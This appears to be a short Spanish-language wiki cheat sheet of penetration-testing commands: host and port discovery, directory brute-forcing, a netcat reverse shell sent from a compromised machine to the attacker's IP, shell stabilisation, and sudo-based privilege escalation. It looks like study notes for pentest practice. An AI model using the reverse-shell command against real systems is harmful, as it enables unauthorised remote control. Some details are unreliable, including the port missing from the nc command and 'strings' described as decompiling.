---
title: CheatSheet
description: Cheatsheet de todos los comandos usados en Hacking
published: true
date: 2024-11-11T16:09:52.824Z
tags: 
editor: markdown
dateCreated: 2024-11-11T14:26:03.405Z
---

# Comandos
Esta sección está dedicada a comandos usados de forma común en hacking.
## Detección
Para la detección de IPs, podremos hacer uso de varios comandos como:
```bash
sudo netdiscover -r (Rango de IP)
```
La detección de puertos, podemos hacer uso de NMap o Nessus. Con NMap seria el siguiente comando:
```bash
sudo nmap -sC -sV (IP)
```
Para la detección de subdirectorios podemos hacer uso de:
```bash
sudo dirb (Enlace)
```
## Shell reversa
Una shell reversa, consiste en una shell ya segurizada que usaremos para poder escribir comandos, primero deberemos poner en nuestra máquina:
```bash
nc -lnvp (Puerto)
```

Tras esto en la máquina vulnerada, deberemos intentar poner el siguiente comando para poder obtener una shell reversa.
```bash
sudo nohup nc -e /bin/bash (Nuestra IP) &
```


### Securizar la shell
Para poder securizarla, deberemos escribir en la shell reversa lo siguiente:
```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

Tras esto haremos un Crtl + Z, para poner los siguientes comandos:
```bash
stty raw -echo;fg
```
Tras esto, deberemos hacer Enter 2 veces y por último poner el siguiente comando
```bash
export TERM=xterm
```
## Escalada de privilegios
Cuando intentemos hacer una escalada de privilegios, deberemos tener en cuenta que comandos permisos tiene nuestro usuario para poder realizarlo. Para ello ponemos:

```bash
sudo -l
```
Los datos obtenidos deberemos compararlos en: [GtFobins](https://gtfobins.github.io)

## Ingeniería inversa
Cuando tengamos un archivo .exe, deberemos intentar poder descompilarlo. Para ello podemos usar el siguiente comando.
```bash
sudo strings (Fichero)
```